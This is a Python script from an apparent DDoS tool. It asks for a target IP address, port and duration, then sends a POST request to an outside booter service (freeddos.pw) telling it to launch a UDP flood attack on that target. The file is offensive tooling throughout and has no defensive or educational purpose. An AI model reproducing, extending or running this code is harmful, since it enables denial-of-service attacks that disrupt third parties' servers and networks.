from lib.textColor import textGen
import requests
import json

global R,B,C,G,Y,Q
R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; G='\033[1;32m'; Y='\033[1;33m'; Q='\033[1;36m'

with open('./methods/headers/header.json') as file:
    header = json.load(file)

banner = '''
███████╗██╗   ██╗██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗     ██████╗██████╗ 
██╔════╝╚██╗ ██╔╝██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔════╝╚════██╗
███████╗ ╚████╔╝ ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     ██║      █████╔╝
╚════██║  ╚██╔╝  ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██║     ██╔═══╝ 
███████║   ██║    ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ╚██████╗███████╗
╚══════╝   ╚═╝     ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝

							       make a by: Noutz     
'''

logo = textGen(banner)

def attack_DNS_NTP_TCPMB():
    ip = input('\33]0;Kusty🐀,  DDoSer!💣\a'+'%s\n%sWARNING%s : %sSorry but this method is under maintenance...%s\n\n%sIPv4 address%s: '%(logo,R,C,Y,C,B,C))
    port = int(input('%sPort%s: '%(B,C)))
    time = int(input('%sTime%s: '%(B,C)))

    method = 'UDP-MIX' #   UDP-MIX

    data = f"host={ip}&port={port}&time={time}&method={method}"
    url = "https://freeddos.pw/ajax/attack"

    method = 'dnsforky'

    try:
        request = requests.post(url, headers=header, data=data).text
        request = json.loads(request)

        if request['status'] == 'sucess':
            msg=''
            for i in request:
                msg += str('\n[ ' + G + str(i.upper()) + C + ' : ' + str(request[i]) + ' ]')
            print('\n[ %sMETHOD%s : %s ]'%(Y,C,method) + msg)
        else:
            msg=''
            for i in request:
                msg += str('\n[ ' + R + str(i.upper()) + C + ' : ' + str(request[i]) + ' ]')
            print('\n[ %sMETHOD%s : %s ]'%(Y,C,method) + msg)
    
    except Exception as err:
        print('\n[%s!%s] Request error!  ERROR: %s'%(R,C,err))
